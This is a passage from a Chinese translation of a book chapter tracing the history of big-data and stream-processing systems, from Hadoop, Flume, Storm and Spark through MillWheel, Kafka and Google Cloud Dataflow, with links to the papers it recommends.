于 2005 年问世，当时 Doug Cutting 和 Mike Cafarella 认为 MapReduce 论文中的想法太棒了，他们在构建 Nutch webcrawler 的分布式版本正好需要这套分布式理论基础。在这之前，他们已经实现了自己版本的 Google 分布式文件系统（最初称为 Nutch 分布式文件系统的 NDFS，后来改名为 HDFS 或 Hadoop 分布式文件系统）。因此下一步，自然而然的，基于 HDFS 之上添加 MapReduce 计算层。他们称 MapReduce 这一层为 Hadoop。</p><p>Hadoop 和 MapReduce 之间的主要区别在于 Cutting 和 Cafarella 通过开源（以及 HDFS 的源代码）确保 Hadoop 的源代码与世界各地可以共享，最终成为 Apache Hadoop 项目的一部分。雅虎聘请 Cutting 来帮助将雅虎网络爬虫项目升级为全部基于 Hadoop 架构，这个项目使得 Hadoop 有效提升了生产可用性以及工程效率。自那以后，整个开源生态的大数据处理工具生态系统得到了蓬勃发展。与 MapReduce 一样，相信其他人已经能够比我更好地讲述了 Hadoop 的历史。我推荐一个特别好的讲解是 Marko Bonaci 的《The history of Hadoop》，它本身也是一本已经出版的纸质书籍（图 10-7）。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h77mn4tmj20u00n8jsn.jpg" alt></p><p>在 Hadoop 这部分，我期望读者朋友能够了解到围绕 Hadoop 的开源生态系统对整个行业产生的巨大影响。通过创建一个开放的社区，工程师可以从早期的 GFS 和 MapReduce 论文中改进和扩展这些想法，这直接促进生态系统的蓬勃发展，并基于此之上产生了许多有用的工具，如 Pig，Hive，HBase，Crunch 等等。这种开放性是导致我们整个行业现有思想多样性的关键，同时 Hadoop 开放性生态亦是直接促进流计算系统发展。</p><h3 id="flume"><a href="#flume" class="headerlink" title="flume"></a>flume</h3><p>我们现在再回到 Google，讨论 Google 公司中 MapReduce 的官方继承者：Flume（[图 10-8]，有时也称为 FlumeJava，这个名字起源于最初 Flume 的 Java 版本。需要注意的是，这里的 Flume 不要与 Apache Flume 混淆，这部分是面向不同领域的东西，只是恰好有同样的名字）。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h77zrwe0j20u00dwjrl.jpg" alt></p><p>Flume 项目由 Craig Chambers 在 2007 年谷歌西雅图办事处成立时发起。Flume 最初打算是希望解决 MapReduce 的一些固有缺点，这些缺点即使在 MapReduce 最初大红大紫的阶段已经非常明显。其中许多缺点都与 MapReduce 完全限定的 Map→Shuffle→Reduce 编程模型相关 ; 这个编程模型虽然简单，但它带来了一些缺点：</p><ul><li>由于单个 MapReduce 作业并不能完成大量实际上的业务案例，因此许多定制的编排系统开始在 Google 公司内部出现，这些编排系统主要用于协调 MapReduce 作业的顺序。这些系统基本上都在解决同一类问题，即将多个 MapReduce 作业粘合在一起，创建一个解决复杂问题的数据管道。然而，这些编排系统都是 Google 各自团队独立开发的，相互之间也完全不兼容，是一类典型的重复造轮子案例。</li><li>更糟糕的是，由于 MapReduce 设计的 API 遵循严格结构，在很多情况下严格遵循 MapReduce 编程模型会导致作业运行效率低下。例如，一个团队可能会编写一个简单地过滤掉一些元素的 MapReduce，即，仅有 Map 阶段没有 Reduce 阶段的作业。这个作业下游紧接着另一个团队同样仅有 Map 阶段的作业，进行一些字段扩展和丰富 (仍然带一个空的 Reduce 阶段作业）。第二个作业的输出最终可能会被第三个团队的 MapReduce 作业作为输入，第三个作业将对数据执行某些分组聚合。这个 Pipeline，实际上由一个合并 Map 阶段 (译者注: 前面两个 Map 合并为一个 Map)，外加一个 Reduce 阶段即可完成业务逻辑，但实际上却需要编排三个完全独立的作业，每个作业通过 Shuffle 和 Output 两个步骤链接在一起。假设你希望保持代码的逻辑性和清洁性，于是你考虑将部分代码进行合并，但这个最终导致第三个问题。</li><li>为了优化 MapReduce 作业中的这些低效代码，工程师们开始引入手动优化，但不幸的是，这些优化会混淆 Pipeline 的简单逻辑，进而增加维护和调试成本。</li></ul><p>Flume 通过提供可组合的高级 API 来描述数据处理流水线，从而解决了这些问题。这套设计理念同样也是 Beam 主要的抽象模型，即 PCollection 和 PTransform 概念，如图 10-9 所示。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h785ps5gj20u00e50st.jpg" alt></p><p>这些数据处理 Pipeline 在作业启动时将通过优化器生成，优化器将以最佳效率生成 MapReduce 作业，然后交由框架编排执行。整个编译执行原理图可以在图 10-10 中看到。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h78bx6woj20u00fb0sv.jpg" alt></p><p>也许 Flume 在自动优化方面最重要的案例就是是合并（Reuven 在第 5 章中讨论了这个主题），其中两个逻辑上独立的阶段可以在同一个作业中顺序地（消费者 - 生产者融合）执行或者并行执行（兄弟融合），如图 10-11 所示。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h78hq0dzj20u00gwglp.jpg" alt></p><p>将两个阶段融合在一起消除了序列化 / 反序列化和网络开销，这在处理大量数据的底层 Pipeline 中非常重要。</p><p>另一种类型的自动优化是 combiner lifting（见图 10-12），当我们讨论增量合并时，我们已经在第 7 章中讨论了这些机制。combiner lifting 只是我们在该章讨论的多级组合逻辑的编译器自动优化：以求和操作为例，求和的合并逻辑本来应该运算在分组 (译者注: 即 Group-By) 操作后，由于优化的原因，被提前到在 group-by-key 之前做局部求和（根据 group-by-key 的语义，经过 group-by-key 操作需要跨网络进行大量数据 Shuffle）。在出现数据热点情况下，将这个操作提前可以大大减少通过网络 Shuffle 的数据量，并且还可以在多台机器上分散掉最终聚合的机器负载。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h78n948fj20u00dxmx9.jpg" alt></p><p>由于其更清晰的 API 定义和自动优化机制，在 2009 年初 Google 内部推出后 FlumeJava 立即受到巨大欢迎。之后，该团队发表了题为《Flume Java: Easy, Efficient Data-Parallel Pipelines》（<a href="https://storage.googleapis.com/pub-tools-public-publication-data/pdf/35650.pdf）" target="_blank" rel="noopener">https://storage.googleapis.com/pub-tools-public-publication-data/pdf/35650.pdf）</a> 的论文（参见图 10-13），这篇论文本身就是一个很好的学习 FlumeJava 的资料。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h78xgh4qj20u00mewi2.jpg" alt></p><p>Flume C++ 版本很快于 2011 年发布。之后 2012 年初，Flume 被引入为 Google 的所有新工程师提供的 Noogler6 培训内容。MapReduce 框架于是最终被走向被替换的命运。</p><p>从那时起，Flume 已经迁移到不再使用 MapReduce 作为执行引擎 ; 相反，Flume 底层基于一个名为 Dax 的内置自定义执行引擎。 工作本身。不仅让 Flume 更加灵活选择执行计划而不必拘泥于 Map→Shuffle→Reduce MapReduce 的模型，Dax 还启用了新的优化，例如 Eugene Kirpi-chov 和 Malo Denielou 的《No shard left behind》博客文章（<a href="https://cloud.google.com/blog/products/gcp/no-shard-left-behind-dynamic-work-rebalancing-in-google-cloud-dataflow）" target="_blank" rel="noopener">https://cloud.google.com/blog/products/gcp/no-shard-left-behind-dynamic-work-rebalancing-in-google-cloud-dataflow）</a> 中描述的动态负载均衡（图 10-14）。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h796bl2pj20u00kwabc.jpg" alt></p><p>尽管那篇博客主要是基于 Google DataFlow 框架下讨论问题，但动态负载均衡（或液态分片，Google 内部更习惯这样叫）可以让部分已经完成工作的 Worker 能够从另外一些繁忙的 Worker 手中分配一些额外的工作。在 Job 运行过程中，通过不断的动态调整负载分配可以将系统运行效率趋近最优，这种算法将比传统方法下有经验工程师手工设置的初始参数性能更好。Flume 甚至为 Worker 池变化进行了适配，一个拖慢整个作业进度的 Worker 会将其任务转移到其他更加高效的 Worker 上面进行执行。Flume 的这些优化手段，在 Google 内部为公司节省了大量资源。</p><p>最后一点，Flume 后来也被扩展为支持流语义。除 Dax 作为一个批处理系统引擎外，Flume 还扩展为能够在 MillWheel 流处理系统上执行作业（稍后讨论）。在 Google 内部，之前本书中讨论过的大多数高级流处理语义概念首先被整合到 Flume 中，然后才进入 Cloud Dataflow 并最终进入 Apache Beam。</p><p>总而言之，本节我们主要强调的是 Flume 产品给人引入高级管道概念，这使得能够让用户编写清晰易懂且自动优化的分布式大数据处理逻辑，从而让创建更大型更复杂的分布式大数据任务成为了可能，Flume 让我们业务代码在保持代码清晰逻辑干净的同时，自动具备编译器优化能力。</p><h3 id="strom"><a href="#strom" class="headerlink" title="strom"></a>strom</h3><p>接下来是 Apache Storm（图 10-15），这是我们研究的第一个真正的流式系统。 Storm 肯定不是业界使用最早的流式处理系统，但我认为这是整个行业真正广泛采用的第一个流式处理系统，因此我们在这里需要仔细研究一下。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h79kbcyqj20u00dwglt.jpg" alt></p><p>Storm 是 Nathan Marz 的心血结晶，Nathan Marz 后来在一篇题为《History of Apache Storm and lessons learned》的博客文章（<a href="http://nathanmarz.com/blog/history-of-apache-storm-and-lessons-learned.html）" target="_blank" rel="noopener">http://nathanmarz.com/blog/history-of-apache-storm-and-lessons-learned.html）</a> 中记录了其创作历史（图 10-16）。 这篇冗长的博客讲述了 BackType 这家创业公司一直在自己通过消息队列和自定义代码去处理 Twitter 信息流。Nathan 和十几年前 Google 里面设计 MapReduce 相关工程师有相同的认识：实际的业务处理的代码仅仅是系统代码很小一部分，如果有个统一的流式实时处理框架负责处理各类分布式系统底层问题，那么基于之上构建我们的实时大数据处理将会轻松得多。基于此，Nathan 团队完成了 Storm 的设计和开发。</p><p>值得一提的是，Storm 的设计原则和其他系统大相径庭，Storm 更多考虑到实时流计算的处理时延而非数据的一致性保证。后者是其他大数据系统必备基础产品特征之一。Storm 针对每条流式数据进行计算处理，并提供至多一次或者至少一次的语义保证；同时不提供任何状态存储能力。相比于 Batch 批处理系统能够提供一致性语义保证，Storm 系统能够提供更低的数据处理延迟。对于某些数据处理业务场景来说，这确实也是一个非常合理的取舍。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h79pvt78j20u00jt75d.jpg" alt></p><p>不幸的是，人们很快就清楚地知道他们想要什么样的流式处理系统。他们不仅希望快速得到业务结果，同时希望系统具有低延迟和准确性，但仅凭 Storm 架构实际上不可能做到这一点。针对这个情况，Nathan 后面又提出了 Lambda 架构。</p><p>鉴于 Storm 的局限性，聪明的工程师结合弱一致语义的 Storm 流处理以及强一致语义的 Hadoop 批处理。前者产生了低延迟，但不精确的结果，而后者产生了高延迟，但精确的结果，双剑合璧，整合两套系统整体提供的低延迟但最终一致的输出结果。我们在第 1 章中了解到，Lambda 架构是 Marz 的另一个创意，详见他的文章《“如何击败 CAP 定理”》（<a href="http://nathanmarz.com/blog/how-to-beat-the-cap-theorem.html）" target="_blank" rel="noopener">http://nathanmarz.com/blog/how-to-beat-the-cap-theorem.html）</a> （图 10-17）。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h79w7p4ej20u00oj0ve.jpg" alt></p><p>我已经花了相当多的时间来分析 Lambda 架构的缺点，以至于我不会在这里啰嗦这些问题。但我要重申一下：尽管它带来了大量成本问题，Lambda 架构当前还是非常受欢迎，仅仅是因为它满足了许多企业一个关键需求：系统提供低延迟但不准确的数据，后续通过批处理系统纠正之前数据，最终给出一致性的结果。从流处理系统演变的角度来看，Storm 确实为普罗大众带来低延迟的流式实时数据处理能力。然而，它是以牺牲数据强一致性为代价的，这反过来又带来了 Lambda 架构的兴起，导致接下来多年基于两套系统架构之上的数据处理带来无尽的麻烦和成本。</p><p>撇开其他问题先不说，Storm 是行业首次大规模尝试低延迟数据处理的系统，其影响反映在当前线上大量部署和应用各类流式处理系统。在我们要放下 Storm 开始聊其他系统之前，我觉得还是很有必要去说说 Heron 这个系统。在 2015 年，Twitter 作为 Storm 项目孵化公司以及世界上已知最大的 Storm 用户，突然宣布放弃 Storm 引擎，宣称正在研发另外一套称之为 Heron 的流式处理框架。Heron 旨在解决困扰 Storm 的一系列性能和维护问题，同时向 Storm 保持 API 兼容，详见题为《Twitter Heron：Stream Processing at scale》的论文（<a href="https://www.semanticscholar.org/paper/Twitter-Heron%3A-Stream-Processing-at-Scale-Kulkarni-Bhagat/e847c3ec130da57328db79a7fea794b07dbccdd9）" target="_blank" rel="noopener">https://www.semanticscholar.org/paper/Twitter-Heron%3A-Stream-Processing-at-Scale-Kulkarni-Bhagat/e847c3ec130da57328db79a7fea794b07dbccdd9）</a> （图 10-18）。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7a341dvj20u00mtjv0.jpg" alt></p><p>Heron 本身也是开源产品（但开源不在 Apache 项目中）。鉴于 Storm 仍然在社区中持续发展，现在又冒出一套和 Storm 竞争的软件，最终两边系统鹿死谁手，我们只能拭目以待了。</p><h3 id="Spark"><a href="#Spark" class="headerlink" title="Spark"></a>Spark</h3><p>继续走起，我们现在来到 Apache Spark（图 10-19）。再次，我又将大量简化 Spark 系统对行业的总体影响探讨，仅仅关注我们的流处理领域部分。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7aed762j20u00dwq35.jpg" alt></p><p>Spark 在 2009 年左右诞生于加州大学伯克利分校的著名 AMPLab。最初推动 Spark 成名的原因是它能够经常在内存执行大量的计算工作，直到作业的最后一步才写入磁盘。工程师通过弹性分布式数据集（RDD）理念实现了这一目标，在底层 Pipeline 中能够获取每个阶段数据结果的所有派生关系，并且允许在机器故障时根据需要重新计算中间结果，当然，这些都基于一些假设 a）输入是总是可重放的，b）计算是确定性的。对于许多案例来说，这些先决条件是真实的，或者看上去足够真实，至少用户确实在 Spark 享受到了巨大的性能提升。从那时起，Spark 逐渐建立起其作为 Hadoop 事实上的继任产品定位。</p><p>在 Spark 创建几年后，当时 AMPLab 的研究生 Tathagata Das 开始意识到：嘿，我们有这个快速的批处理引擎，如果我们将多个批次的任务串接起来，用它能否来处理流数据？于是乎，Spark Streaming 诞生了。</p><p>关于 Spark Streaming 的真正精彩之处在于：强大的批处理引擎解决了太多底层麻烦的问题，如果基于此构建流式处理引擎则整个流处理系统将简单很多，于是世界又多一个流处理引擎，而且是可以独自提供一致性语义保障的流式处理系统。换句话说，给定正确的用例，你可以不用 Lambda 架构系统直接使用 Spark Streaming 即可满足数据一致性需求。为 Spark Streaming 手工点赞！</p><p>这里的一个主要问题是“正确的用例”部分。早期版本的 Spark Streaming（1.x 版本）的一大缺点是它仅支持特定的流处理语义：即，处理时间窗口。因此，任何需要使用事件时间，需要处理延迟数据等等案例都无法让用户使用 Spark 开箱即用解决业务。这意味着 Spark Streaming 最适合于有序数据或事件时间无关的计算。而且，正如我在本书中重申的那样，在处理当今常见的大规模、以用户为中心的数据集时，这些先决条件看上去并不是那么常见。</p><p>围绕 Spark Streaming 的另一个有趣的争议是“microbatch 和 true streaming”争论。由于 Spark Streaming 建立在批处理引擎的重复运行的基础之上，因此批评者声称 Spark Streaming 不是真正的流式引擎，因为整个系统的处理基于全局的数据切分规则。这个或多或少是实情。尽管流处理引擎几乎总是为了吞吐量而使用某种批处理或者类似的加大吞吐的系统策略，但它们可以灵活地在更精细的级别上进行处理，一直可以细化到某个 key。但基于微批处理模型的系统在基于全局切分方式处理数据包，这意味着同时具备低延迟和高吞吐是不可能的。确实我们看到许多基准测试表明这说法或多或少有点正确。当然，作业能够做到几分钟或几秒钟的延迟已经相当不错了，实际上生产中很少有用例需要严格数据正确性和低延迟保证。所以从某种意义上说，Spark 瞄准最初目标客户群体打法是非常到位的，因为大多数业务场景均属于这一类。但这并未阻止其竞争对手将此作为该平台的巨大劣势。就个人而言，在大多数情况下，我认为这只是一个很小问题。</p><p>撇开缺点不说，Spark Streaming 是流处理的分水岭：第一个广泛使用的大规模流处理引擎，它也可以提供批处理系统的正确性保证。 当然，正如前面提到的，流式系统只是 Spark 整体成功故事的一小部分，Spark 在迭代处理和机器学习领域做出了重要贡献，其原生 SQL 集成以及上述快如闪电般的内存计算，都是非常值得大书特书的产品特性。</p><p>如果您想了解有关原始 Spark 1.x 架构细节的更多信息，我强烈推荐 Matei Zaharia 关于该主题的论文《 “An Architecture for Fast and General Data Processing on Large Clusters》（图 10-20）。 这是 113 页的 Spark 核心讲解论文，非常值得一读。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7aler0xj20u00srwi6.jpg" alt></p><p>时至今日，Spark 的 2.x 版本极大地扩展了 Spark Streaming 的语义功能，其中已经包含了本书中描述流式处理模型的许多部分，同时试图简化一些更复杂的设计。 Spark 甚至推出了一种全新的、真正面向流式处理的架构，用以规避掉微批架构的种种问题。但是曾经，当 Spark 第一次出现时，它带来的重要贡献是它是第一个公开可用的流处理引擎，具有数据处理的强一致性语义，尽管这个特性只能用在有序数据或使用处理时间计算的场景。</p><h3 id="MillWheel"><a href="#MillWheel" class="headerlink" title="MillWheel"></a>MillWheel</h3><p>接下来我们讨论 MillWheel，这是我在 2008 年加入 Google 后的花 20％时间兼职参与的项目，后来在 2010 年全职加入该团队（图 10-21）。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7bomue7j20u00dwt8x.jpg" alt></p><p>MillWheel 是 Google 最早的通用流处理架构，该项目由 Paul Nordstrom 在 Google 西雅图办事处开业时发起。 MillWheel 在 Google 内的成功与长期以来一直致力于为无序数据提供低延迟，强一致的处理能力不无关系。在本书的讲解中，我们已经多次分别讨论了促使 MillWheel 成为一款成功产品的方方面面。</p><ul><li>第五章，Reuven 详细讨论过数据精准一次的语义保证。精准一次的语义保证对于正确性至关重要。</li><li>第七章，我们研究了状态持久化，这为在不那么靠谱的普通硬件上执行的长时间数据处理业务并且需要保证正确性奠定了基础。</li><li>第三章，Slava 讨论了 Watermark。Watermark 为处理无序数据提供了基础。</li><li>第七章，我们研究了持久性计时器，它们提供了 Watermark 与业务逻辑之间的某些关联特性。</li></ul><p>有点令人惊讶的是，MillWheel 项目最开始并未关注数据正确性。保罗最初的想法更接近于 Storm 的设计理论：具有弱一致性的低延迟数据处理。这是最初的 MillWheel 客户，一个关于基于用户搜索数据构建会话和另一个对搜索查询执行异常检测（来自 MillWheel 论文的 Zeitgeist 示例），这两家客户迫使项目走向了正确的方向。两者都非常需要强一致的数据结果：会话用于推断用户行为，异常检测用于推断搜索查询的趋势 ; 如果他们提供的数据不靠谱，两者效果都会显着下降。最终，幸运的是，MillWheel 的设计被客户需求导向追求数据强一致性的结果。</p><p>支持乱序数据处理，这是现代流式处理系统的另一个核心功能。这个核心功能通常也被认为是被 MillWheel 引入到流式处理领域，和数据准确性一样，这个功能也是被客户需求推动最终加入到我们系统。 Zeitgeist 项目的大数据处理过程，通常被我们拿来用作一个真正的流式处理案例来讨论。Zeitgeist 项目希望检测识别搜索查询流量中的异常，并且需要捕获异常流量。对于这个大数据项目数据消费者来说，流计算将所有计算结果产出并让用户轮询所有 key 用来识别异常显然不太现实，数据用户要求系统直接计算某个 key 出现异常的数据结果，而不需要上层再来轮询。对于异常峰值（即查询流量的增加），这还相对来说比较简单好解决：当给定查询的计数超过查询的预期值时，系统发出异常信号。但是对于异常下降（即查询流量减少），问题有点棘手。仅仅看到给定搜索词的查询数量减少是不够的，因为在任何时间段内，计算结果总是从零开始。在这些情况下你必须确保你的数据输入真的能够代表当前这段时间真实业务流量，然后才将计算结果和预设模型进行比较。</p><blockquote><p><strong>真正的流式处理</strong></p></blockquote><blockquote><p>“真正的流式处理用例”需要一些额外解释。流式系统的一个新的演化趋势是，舍弃掉部分产品需求以简化编程模型，从而使整个系统简单易用。例如，在撰写本文时，Spark Structured Streaming 和 Apache Kafka Streams 都将系统提供的功能限制在第 8 章中称为“物化视图语义”范围内，本质上对最终一致性的输出表不停做数据更新。当您想要将上述输出表作为结果查询使用时，物化视图语义非常匹配你的需求：任何时候我们只需查找该表中的值并且 (译者注: 尽管结果数据一直在不停被更新和改变) 以当前查询时间请求到查询结果就是最新的结果。但在一些需要真正流式处理的场景，例如异常检测，上述物化视图并不能够很好地解决这类问题。</p></blockquote><blockquote><p>接下来我们会讨论到，异常检测的某些需求使其不适合纯物化视图语义（即，依次针对单条记录处理），特别当需要完整的数据集才能够识别业务异常，而这些异常恰好是由于数据的缺失或者不完整导致的。另外，不停轮询结果表以查看是否有异常其实并不是一个扩展性很好的办法。真正的流式用户场景是推动 watermark 等功能的原始需求来源。(Watermark 所代表的时间有先有后，我们需要最低的 Watermark 追踪数据的完整性，而最高的 Watermark 在数据时间发生倾斜时候非常容易导致丢数据的情况发生，类似 Spark Structured Streaming 的用法)。省略类似 Watermark 等功能的系统看上去简单不少，但换来代价是功能受限。在很多情况下，这些功能实际上有非常重要的业务价值。但如果这样的系统声称这些简化的功能会带来系统更多的普适性，不要听他们忽悠。试问一句，功能需求大量被砍掉，如何保证系统的普适性呢？</p></blockquote><p>Zeitgeist 项目首先尝试通过在计算逻辑之前插入处理时间的延迟数值来解决数据延迟问题。当数据按顺序到达时，这个思路处理逻辑正常。但业务人员随后发现数据有时可能会延迟很大，从而导致数据无序进入流式处理系统。一旦出现这个情况，系统仅仅采用处理时间的延迟是不够的，因为底层数据处理会因为数据乱序原因被错误判断为异常。最终，我们需要一种等待数据到齐的机制。</p><p>之后 Watermark 被设计出来用以解决数据乱序的问题。正如 Slava 在第 3 章中所描述的那样，基本思想是跟踪系统输入数据的当前进度，对于每个给定的数据源，构建一个数据输入进度用来表征输入数据的完整性。对于一些简单的数据源，例如一个带分区的 Kafka Topic，每个 Topic 下属的分区被写入的是业务时间持续递增的数据（例如通过 Web 前端实时记录的日志事件），这种情况下我们可以计算产生一个非常完美的 Watermark。但对于一些非常复杂的数据输入，例如动态的输入日志集，一个启发式算法可能是我们能够设计出来最能解决业务问题的 Watermark 生成算法了。但无论哪种方式，Watermark 都是解决输入事件完整性最佳方式。之前我们尝试使用处理时间来解决事件输入完整性，有点驴头不及马嘴的感觉。</p><p>得益于客户的需求推动，MillWheel 最终成为能够支持无序数据的强大流处理引擎。因此，题为《MillWheel: Fault-Tolerant Stream Processing at Internet Scale》（图 10-22）的论文花费大部分时间来讨论在这样的系统中提供正确性的各种问题，一致性保证、Watermark。如果您对这个主题感兴趣，那值得花时间去读读这篇论文。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7c6d50hj20u00jrdix.jpg" alt></p><p>MillWheel 论文发表后不久，MillWheel 就成为 Flume 底层提供支撑的流式处理引擎，我们称之为 Streaming Flume。今天在谷歌内部，MillWheel 被下一代理论更为领先的系统所替换: Windmill（这套系统同时也为 DataFlow 提供了执行引擎），这是一套基于 MillWheel 之上，博采众家之长的大数据处理系统，包括提供更好的调度和分发策略、更清晰的框架和业务代码解耦。</p><p>MillWheel 给我们带来最大的价值是之前列出的四个概念（数据精确一次性处理，持久化的状态存储，Watermark，持久定时器）为流式计算提供了工业级生产保障：即使在不可靠的商用硬件上，也可以对无序数据进行稳定的、低延迟的处理。</p><h3 id="Kafka"><a href="#Kafka" class="headerlink" title="Kafka"></a>Kafka</h3><p>我们开始讨论 Kafka（图 10-23）。 Kafka 在本章讨论的系统中是独一无二的，因为它不是数据计算框架，而是数据传输和存储的工具。但是，毫无疑问，Kafka 在我们正在讨论的所有系统中扮演了推动流处理的最有影响力的角色之一。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7citnfkj20u00dwt8x.jpg" alt></p><p>如果你不熟悉它，我们可以简单描述为: Kafka 本质上是一个持久的流式数据传输和存储工具，底层系统实现为一组带有分区结构的日志型存储。它最初是由 Neha Narkhede 和 Jay Kreps 等业界大牛在 LinkedIn 公司内部开发的，其卓越的特性有:</p><ul><li>提供一个干净的持久性模型，让大家在流式处理领域里面可以享受到批处理的产品特性，例如持久化、可重放。</li><li>在生产者和消费者之间提供弹性隔离。</li><li>我们在第 6 章中讨论过的流和表之间的关系，揭示了思考数据处理的基本方式，同时还提供了和数据库打通的思路和概念。</li><li>来自于上述所有方面的影响，不仅让 Kafka 成为整个行业中大多数流处理系统的基础，而且还促进了流处理数据库和微服务运动。</li></ul><p>在这些特性中，有两个对我来说最为突出。第一个是流数据的持久化和可重放性的应用。在 Kafka 之前，大多数流处理系统使用某种临时、短暂的消息系统，如 Rabbit MQ 甚至是普通的 TCP 套接字来发送数据。数据处理的一致性往往通过生产者数据冗余备份来实现（即，如果下游数据消费者出现故障，则上游生产者将数据进行重新发送），但是上游数据的备份通常也是临时保存一下。大多数系统设计完全忽略在开发和测试中需要重新拉取数据重新计算的需求。但 Kafka 的出现改变了这一切。从数据库持久日志概念得到启发并将其应用于流处理领域，Kafka 让我们享受到了如同 Batch 数据源一样的安全性和可靠性。凭借持久化和可重放的特点，流计算在健壮性和可靠性上面又迈出关键的一步，为后续替代批处理系统打下基础。</p><p>作为一个流式系统开发人员，Kafka 的持久化和可重放功能对业界产生一个更有意思的变化就是: 当今大量流处理引擎依赖源头数据可重放来提供端到端精确一次的计算保障。可重放的特点是 Apex，Flink，Kafka Streams，Spark 和 Storm 的端到端精确一次保证的基础。当以精确一次模式执行时，每个系统都假设 / 要求输入数据源能够重放之前的部分数据 (从最近 Checkpoint 到故障发生时的数据)。当流式处理系统与不具备重放能力的输入源一起使用时（哪怕是源头数据能够保证可靠的一致性数据投递，但不能提供重放功能），这种情况下无法保证端到端的完全一次语义。这种对可重放（以及持久化等其他特点）的广泛依赖是 Kafka 在整个行业中产生巨大影响的间接证明。</p><p>Kafka 系统中第二个值得注意的重点是流和表理论的普及。我们花了整个第 6 章以及第 8 章、第 9 章来讨论流和表，可以说流和表构成了数据处理的基础，无论是 MapReduce 及其演化系统，SQL 数据库系统，还是其他分支的数据处理系统。并不是所有的数据处理方法都直接基于流或者表来进行抽象，但从概念或者理论上说，表和流的理论就是这些系统的运作方式。作为这些系统的用户和开发人员，理解我们所有系统构建的核心基础概念意义重大。我们都非常感谢 Kafka 社区的开发者，他们帮助我们更广泛更加深入地了解到批流理论。</p><p>如果您想了解更多关于 Kafka 及其理论核心，JackKreps 的《I❤Logs》（O’Reilly; 图 10-24）是一个很好的学习资料。另外，正如第 6 章中引用的那样，Kreps 和 Martin Kleppmann 有两篇文章（图 10-25），我强烈建议您阅读一下关于流和表相关理论。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7cqke9dj20dw0i80tf.jpg" alt></p><p>Kafka 为流处理领域做出了巨大贡献，可以说比其他任何单一系统都要多。特别是，对输入和输出流的持久性和可重放的设计，帮助将流计算从近似工具的小众领域发展到在大数据领域妇孺皆知的程度起了很大作用。此外，Kafka 社区推广的流和表理论对于数据处理引发了我们深入思考。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7cwnv5vj20u00clq3j.jpg" alt></p><h3 id="DataFlow"><a href="#DataFlow" class="headerlink" title="DataFlow"></a>DataFlow</h3><p>Cloud Dataflow（图 10-26）是 Google 完全托管的、基于云架构的数据处理服务。 Dataflow 于 2015 年 8 月推向全球。DataFlow 将 MapReduce，Flume 和 MillWheel 的十多年经验融入其中，并将其打包成 Serverless 的云体验。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7d644kqj20u00qe0xe.jpg" alt></p><p>虽然 Google 的 Dataflow 的 Serverless 特点可能是从系统角度来看最具技术挑战性以及有别于其他云厂商产品的重要因素，但我想在此讨论主要是其批流统一的编程模型。编程模型包括我们在本书的大部分内容中所讨论的转换，窗口，水印，触发器和聚合计算。当然，所有这些讨论都包含了思考问题的 what、where、when、how。</p><p>DataFlow 模型首先诞生于 Flume，因为我们希望将 MillWheel 中强大的无序数据计算能力整合到 Flume 提供的更高级别的编程模型中。这个方式可以让 Google 员工在内部使用 Flume 进行统一的批处理和流处理编程。</p><p>关于统一模型的核心关键思考在于，尽管在当时我们也没有深刻意识到，批流处理模型本质上没有区别: 仅仅是在表和流的处理上有些小变化而已。正如我们在第 6 章中所讨论到的，主要的区别仅仅是在将表上增量的变化转换为流，其他一切在概念上是相同的。通过利用批处理和流处理两者大量的共性需求，可以提供一套引擎，适配于两套不同处理方式，这让流计算系统更加易于使用。</p><p>除了利用批处理和流处理之间的系统共性之外，我们还仔细查看了多年来我们在 Google 中遇到的各种案例，并使用这些案例来研究统一模型下系统各个部分。我们研究主要内容如下：</p><ul><li>未对齐的事件时间窗口（如会话窗口），能够简明地表达这类复杂的分析，同时亦能处理乱序数据。</li><li>自定义窗口支持，系统内置窗口很少适合所有业务场景，需要提供给用户自定义窗口的能力。</li><li>灵活的触发和统计模式，能够满足正确性，延迟，成本的各项业务需求。</li><li>使用 Watermark 来推断输入数据的完整性，这对于异常检测等用例至关重要，其中异常检测逻辑会根据是否缺少数据做出异常判断。</li><li>底层执行环境的逻辑抽象，无论是批处理，微批处理还是流式处理，都可以在执行引擎中提供灵活的选择，并避免系统级别的参数设置（例如微批量大小）进入逻辑 API。</li></ul><p>总之，这些平衡了灵活性，正确性，延迟和成本之间的关系，将 DataFlow 的模型应用于大量用户业务案例之中。</p><p>考虑到我们之前整本书都在讨论 DataFlow 和 Beam 模型的各类问题，我在此处重新给大家讲述这些概念纯属多此一举。但是，如果你正在寻找稍微更具学术性的内容以及一些应用案例，我推荐你看下 2015 年发表的《DataFlow 论文..》（图 10-27）。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7dd2y3uj20u00qe0xe.jpg" alt></p><p>DataFlow 还有不少可以大书特书的功能特点，但在这章内容构成来看，我认为 DataFlow 最重要的是构建了一套批流统一的大数据处理模型。DataFlow 为我们提供了一套全面的处理无界且无序数据集的能力，同时这套系统很好的平衡了正确性、延迟、成本之间的相互关系。</p><h3 id="Flink"><a href="#Flink" class="headerlink" title="Flink"></a>Flink</h3><p>Flink（图 10-28）在 2015 年突然出现在大数据舞台，然后似乎在一夜之间从一个无人所知的系统迅速转变为人人皆知的流式处理引擎。</p><p><img 